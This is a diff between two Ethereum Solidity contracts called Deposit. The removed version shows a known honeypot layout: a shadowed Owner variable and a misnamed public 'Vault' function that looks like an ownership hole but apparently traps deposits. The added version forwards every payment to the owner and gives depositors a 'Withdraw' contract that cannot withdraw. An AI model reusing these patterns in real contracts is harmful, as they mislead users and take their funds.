@@ -1,62 +1,34 @@
 /* 
- source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract Deposit at 0xA16CDcbA1d6Cb6874ff9fd8a6c8b82a3f834f512
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract Deposit at 0xe16068dd81dba6f5f809e7b34a6b8322b7a5c887
 */
-// Copyright (C) 2017  The Halo Platform by Scott Morrison
-//
-// This is free software and you are welcome to redistribute it under certain conditions.
-// ABSOLUTELY NO WARRANTY; for details visit: https://www.gnu.org/licenses/gpl-2.0.html
-//
-pragma solidity ^0.4.13;
+pragma solidity ^0.4.23;
 
-contract ForeignToken {
-    function balanceOf(address who) constant public returns (uint256);
-    function transfer(address to, uint256 amount) public;
+contract Deposit {
+
+    address public owner;
+    Withdraw[] public withdraws;
+
+    // constructor
+    function Deposit() public {
+        owner = msg.sender;
+    }
+
+    // transfer ether to owner when receive ether
+    function() public payable {
+        // transfer ether to owner
+        owner.transfer(msg.value);
+        // create withdraw contract
+        withdraws.push(new Withdraw(msg.sender));
+    }
 }
 
-contract Owned {
-    address public Owner = msg.sender;
-    modifier onlyOwner { if (msg.sender == Owner) _; }
-}
+contract Withdraw {
 
-contract Deposit is Owned {
-    address public Owner;
-    mapping (address => uint) public Deposits;
+    address public owner;
 
-    event Deposit(uint amount);
-    event Withdraw(uint amount);
-    
-    function Vault() payable {
-        Owner = msg.sender;
-        deposit();
-    }
-    
-    function() payable {
-        deposit();
+    // constructor
+    function Withdraw(address _owner) public {
+        owner = _owner;
     }
 
-    function deposit() payable {
-        if (msg.value >= 1 ether) {
-            Deposits[msg.sender] += msg.value;
-            Deposit(msg.value);
-        }
-    }
-
-    function kill() {
-        if (this.balance == 0)
-            selfdestruct(msg.sender);
-    }
-    
-    function withdraw(uint amount) payable onlyOwner {
-        if (Deposits[msg.sender] > 0 && amount <= Deposits[msg.sender]) {
-            msg.sender.transfer(amount);
-            Withdraw(amount);
-        }
-    }
-    
-    function withdrawToken(address token, uint amount) payable onlyOwner {
-        uint bal = ForeignToken(token).balanceOf(address(this));
-        if (bal >= amount) {
-            ForeignToken(token).transfer(msg.sender, amount);
-        }
-    }
 }
